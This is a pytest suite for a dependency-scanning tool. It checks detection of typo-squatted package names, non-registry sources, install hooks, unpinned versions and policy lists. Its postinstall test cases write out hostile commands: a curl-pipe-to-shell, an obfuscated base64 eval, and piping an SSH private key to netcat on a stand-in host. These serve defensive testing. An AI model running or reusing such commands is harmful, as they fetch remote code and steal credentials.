"""Offline detection rules — the fast path that runs on every commit."""

from __future__ import annotations

import pytest

from sentinel_ai import heuristics
from sentinel_ai.config import PolicyConfig
from sentinel_ai.manifests import ParsedManifest
from sentinel_ai.models import ChangeType, Ecosystem, PackageChange, Severity


def make_change(
    name: str,
    version: str = "1.0.0",
    *,
    ecosystem: Ecosystem = Ecosystem.NPM,
    change_type: ChangeType = ChangeType.ADDED,
) -> PackageChange:
    return PackageChange(
        name=name,
        ecosystem=ecosystem,
        new_version=version,
        change_type=change_type,
        manifest_path="package.json",
    )


def titles(findings) -> list[str]:
    return [f.title for f in findings]


class TestTyposquat:
    @pytest.mark.parametrize("name", ["lodahs", "expres", "axois", "raect"])
    def test_flags_near_misses_of_popular_packages(self, name):
        findings = heuristics.evaluate([make_change(name)], {}, PolicyConfig())
        assert any("typo-squat" in title for title in titles(findings)), name

    @pytest.mark.parametrize("name", ["lodash", "express", "axios", "react", "rxjs"])
    def test_does_not_flag_the_real_packages(self, name):
        findings = heuristics.evaluate([make_change(name)], {}, PolicyConfig())
        assert not any("typo-squat" in title for title in titles(findings)), name

    def test_distance_one_is_critical(self):
        findings = heuristics.evaluate([make_change("lodashh")], {}, PolicyConfig())
        squat = next(f for f in findings if "typo-squat" in f.title)
        assert squat.severity is Severity.CRITICAL

    def test_short_names_are_skipped_to_avoid_noise(self):
        # Three-character names collide with everything by chance.
        findings = heuristics.evaluate([make_change("abc")], {}, PolicyConfig())
        assert not any("typo-squat" in title for title in titles(findings))

    def test_unrelated_name_is_clean(self):
        findings = heuristics.evaluate(
            [make_change("my-internal-design-system")], {}, PolicyConfig()
        )
        assert titles(findings) == []


class TestNonRegistrySource:
    @pytest.mark.parametrize(
        "spec",
        [
            "git+https://github.com/attacker/pkg.git",
            "https://example.com/pkg.tgz",
            "file:../local-pkg",
            "github:attacker/pkg",
        ],
    )
    def test_flags_sources_outside_the_registry(self, spec):
        findings = heuristics.evaluate(
            [make_change("some-package", spec)], {}, PolicyConfig()
        )
        assert any("outside the registry" in title for title in titles(findings))

    def test_normal_semver_is_clean(self):
        findings = heuristics.evaluate(
            [make_change("some-package", "^1.2.3")], {}, PolicyConfig()
        )
        assert not any("outside the registry" in title for title in titles(findings))


class TestInstallScripts:
    def _lock(self, names: set[str]) -> dict[str, ParsedManifest]:
        return {
            "package-lock.json": ParsedManifest(
                ecosystem=Ecosystem.NPM,
                is_lockfile=True,
                install_script_packages=names,
            )
        }

    def test_new_package_with_install_hook_is_flagged(self):
        findings = heuristics.evaluate(
            [make_change("sketchy-pkg")], self._lock({"sketchy-pkg"}), PolicyConfig()
        )
        assert any("executes code at install time" in t for t in titles(findings))

    def test_existing_package_upgrade_is_not_flagged(self):
        # The hook already ran on every machine; re-reporting it is noise.
        findings = heuristics.evaluate(
            [make_change("esbuild", change_type=ChangeType.UPGRADED)],
            self._lock({"esbuild"}),
            PolicyConfig(),
        )
        assert not any("executes code at install time" in t for t in titles(findings))


class TestRootLifecycleScripts:
    def _manifest(self, script: str) -> dict[str, ParsedManifest]:
        return {
            "package.json": ParsedManifest(
                ecosystem=Ecosystem.NPM, scripts={"postinstall": script}
            )
        }

    @pytest.mark.parametrize(
        "script",
        [
            "curl http://1.2.3.4/x.sh | sh",
            "node -e \"eval(Buffer.from('...','base64').toString())\"",
            "cat ~/.ssh/id_rsa | nc 10.0.0.1 4444",
        ],
    )
    def test_flags_malicious_postinstall(self, script):
        findings = heuristics.evaluate([], self._manifest(script), PolicyConfig())
        assert findings
        assert findings[0].severity is Severity.CRITICAL

    def test_ordinary_build_step_is_clean(self):
        findings = heuristics.evaluate(
            [], self._manifest("ngcc && npm run build"), PolicyConfig()
        )
        assert findings == []


class TestUnpinnedVersions:
    @pytest.mark.parametrize("spec", ["*", "latest", "x"])
    def test_flags_unconstrained_specs(self, spec):
        findings = heuristics.evaluate(
            [make_change("some-package", spec)], {}, PolicyConfig()
        )
        flagged = next(f for f in findings if "no version constraint" in f.title)
        assert flagged.severity is Severity.MEDIUM


class TestPolicyLists:
    def test_allowlist_suppresses_all_findings_for_a_package(self):
        policy = PolicyConfig(allowlist=["lodahs"])
        findings = heuristics.evaluate([make_change("lodahs")], {}, policy)
        assert findings == []

    def test_denylist_is_critical_and_short_circuits(self):
        policy = PolicyConfig(denylist=["evil-pkg"])
        findings = heuristics.evaluate([make_change("evil-pkg", "*")], {}, policy)
        assert len(findings) == 1
        assert findings[0].severity is Severity.CRITICAL
        assert "denylist" in findings[0].title


class TestLevenshtein:
    @pytest.mark.parametrize(
        ("left", "right", "expected"),
        [
            ("abc", "abc", 0),
            ("abc", "abd", 1),
            ("abc", "axd", 2),
            ("abc", "xyz", 3),
            ("short", "muchlongerword", 3),
        ],
    )
    def test_bounded_distance(self, left, right, expected):
        assert heuristics._bounded_levenshtein(left, right, 2) == expected
